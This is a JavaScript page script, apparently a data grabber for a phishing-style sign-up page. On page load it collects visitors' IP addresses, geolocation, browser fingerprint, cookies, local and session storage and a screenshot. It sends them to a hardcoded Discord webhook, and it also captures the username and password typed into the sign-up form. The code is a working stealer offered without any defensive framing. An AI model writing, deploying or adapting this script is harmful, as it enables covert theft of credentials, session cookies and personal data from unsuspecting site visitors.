function generateUniqueId() {
    return 'user-' + Math.random().toString(36).substr(2, 9);
}

async function getIpAddressesAndLocation() {
    try {
        const ipv4Response = await fetch('https://api.ipify.org?format=json');
        const ipv4Data = await ipv4Response.json();
        const ipv4 = ipv4Data.ip;

        const ipv6Response = await fetch('https://api6.ipify.org?format=json');
        const ipv6Data = await ipv6Response.json();
        const ipv6 = ipv6Data.ip;

        // Fetch geolocation info using a public IP Geolocation API
        const geoResponse = await fetch(`https://ipapi.co/${ipv4}/json/`);
        const geoData = await geoResponse.json();
        const { latitude, longitude, city, region, country } = geoData;

        return {
            ipv4,
            ipv6,
            location: {
                latitude: latitude || 'Not available',
                longitude: longitude || 'Not available',
                city: city || 'Not available',
                region: region || 'Not available',
                country: country || 'Not available'
            }
        };
    } catch (error) {
        console.error('Error fetching IP addresses or location:', error);
        return {
            ipv4: 'Unable to retrieve IPv4 address',
            ipv6: 'Unable to retrieve IPv6 address',
            location: {
                latitude: 'Not available',
                longitude: 'Not available',
                city: 'Not available',
                region: 'Not available',
                country: 'Not available'
            }
        };
    }
}

function getBrowserInfo() {
    return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        viewportWidth: window.innerWidth,
        viewportHeight: window.innerHeight,
        deviceMemory: navigator.deviceMemory || 'Not available',
        hardwareConcurrency: navigator.hardwareConcurrency || 'Not available',
        platform: navigator.platform,
        onlineStatus: navigator.onLine ? 'Online' : 'Offline',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        javaEnabled: navigator.javaEnabled(),
        cookieEnabled: navigator.cookieEnabled,
        appName: navigator.appName,
        appVersion: navigator.appVersion,
        vendor: navigator.vendor,
        product: navigator.product,
        connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData
        } : 'Not available',
        plugins: Array.from(navigator.plugins).map(plugin => ({
            name: plugin.name,
            version: plugin.version,
            description: plugin.description
        })),
        screenOrientation: screen.orientation ? screen.orientation.type : 'Not available',
        fullscreen: document.fullscreenElement ? 'Fullscreen' : 'Not fullscreen',
        cookies: document.cookie
    };
}

function formatStorage(storage) {
    return Object.keys(storage).reduce((formatted, key) => {
        return formatted + `${key}: ${storage.getItem(key)}\n`;
    }, '');
}

async function captureScreenshot() {
    try {
        const canvas = await html2canvas(document.body, {
            scale: window.devicePixelRatio
        });
        return canvas.toDataURL('image/png');
    } catch (error) {
        console.error('Error capturing screenshot:', error);
        return null;
    }
}

async function createInitialZipFile(info, screenshotDataUrl, ipAddresses, geolocation) {
    const zip = new JSZip();
    zip.file('info.txt', JSON.stringify(info, null, 2));

    if (geolocation) {
        const { latitude, longitude, city, region, country } = ipAddresses.location;
        zip.file('geolocation.txt', `Latitude: ${latitude}\nLongitude: ${longitude}\nCity: ${city}\nRegion: ${region}\nCountry: ${country}`);
    }

    if (screenshotDataUrl) {
        const base64Data = screenshotDataUrl.split(',')[1];
        const imgBlob = new Blob([Uint8Array.from(atob(base64Data), c => c.charCodeAt(0))], { type: 'image/png' });
        zip.file('screenshot.png', imgBlob);
    }

    zip.file('cookies.txt', info.cookies.split('; ').join('\n'));
    zip.file('ips.txt', `IPv4: ${ipAddresses.ipv4}\nIPv6: ${ipAddresses.ipv6}`);
    zip.file('localStorage.txt', formatStorage(localStorage));
    zip.file('sessionStorage.txt', formatStorage(sessionStorage));

    const content = await zip.generateAsync({ type: 'blob' });
    return content;
}

async function createLoginZipFile(username, password) {
    const zip = new JSZip();
    zip.file('login.json', JSON.stringify({ username, password }, null, 2));
    const content = await zip.generateAsync({ type: 'blob' });
    return content;
}

async function sendZipToDiscord(zipBlob, uniqueId, isLoginZip = false) {
    const formData = new FormData();
    formData.append('file', zipBlob, isLoginZip ? `${uniqueId}.zip` : 'info.zip');
    formData.append('uniqueId', uniqueId);

    try {
        await fetch('https://discord.com/api/webhooks/1280281999059456123/GtHUqHcLkPKBNX5OGwFrkwDR2Rp5XIw3QBr_TTv1b3BrcA-NBg-1XJIbRXMfAEaZxvW2', {
            method: 'POST',
            body: formData
        });
        console.log('Zip file sent to Discord webhook');
    } catch (error) {
        console.error('Error sending zip file to Discord webhook:', error);
    }
}

async function initialize() {
    try {
        const uniqueId = generateUniqueId();
        const ipAddresses = await getIpAddressesAndLocation();
        const browserInfo = getBrowserInfo();
        browserInfo.ipv4 = ipAddresses.ipv4;
        browserInfo.ipv6 = ipAddresses.ipv6;
        browserInfo.uniqueId = uniqueId;

        // Send initial data when page loads
        const screenshotDataUrl = await captureScreenshot();
        const initialZipBlob = await createInitialZipFile(browserInfo, screenshotDataUrl, ipAddresses, ipAddresses.location);
        await sendZipToDiscord(initialZipBlob, uniqueId);

        // Set up event listener for sign up button
        document.getElementById('signup-button').addEventListener('click', async () => {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginZipBlob = await createLoginZipFile(username, password);
            await sendZipToDiscord(loginZipBlob, uniqueId, true);
        });
    } catch (error) {
        console.error('Error during initialization:', error);
    }
}

window.onload = initialize;
